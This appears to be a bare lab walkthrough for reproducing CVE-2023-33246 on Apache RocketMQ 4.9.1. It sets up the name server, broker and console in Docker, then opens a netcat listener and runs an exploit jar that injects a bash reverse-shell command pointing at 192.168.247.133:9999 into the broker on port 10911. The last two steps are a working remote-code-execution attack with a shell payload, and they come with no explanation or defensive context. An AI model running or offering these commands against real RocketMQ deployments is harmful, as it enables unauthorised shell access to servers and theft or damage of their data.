1. docker pull apache/rocketmq:4.9.1
2. docker pull apacherocketmq/rocketmq-console:2.0.0
3. docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.1 sh mqnamesrv
4. create broken.conf

5.
```
docker run -d -p 10911:10911 -p 10909:10909 -v /home/osboxes/test/conf/broker.conf:/opt/rocketmq/conf/broker.conf --name rmqbroker --link rmqnamesrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -e "MAX_POSSIBLE_HEAP=200000000" apache/rocketmq:4.9.1 sh mqbroker -c /opt/rocketmq/conf/broker.conf
```

6.
```
docker run -dit --name mqconsole -p 8080:8080 -e "JAVA_OPTS=-Drocketmq.config.namesrvAddr=mqsrv:9876 -Drocketmq.config.isVIPChannel=false" apacherocketmq/rocketmq-console:2.0.0
```

7. `https://127.0.0.1:8080`

8. `nc -lnvp 9999`

9.
```
java -jar CVE-2023-33246.jar -ip "127.0.0.1:10911" -cmd "bash -i >& /dev/tcp/192.168.247.133/9999 0>&1"
```
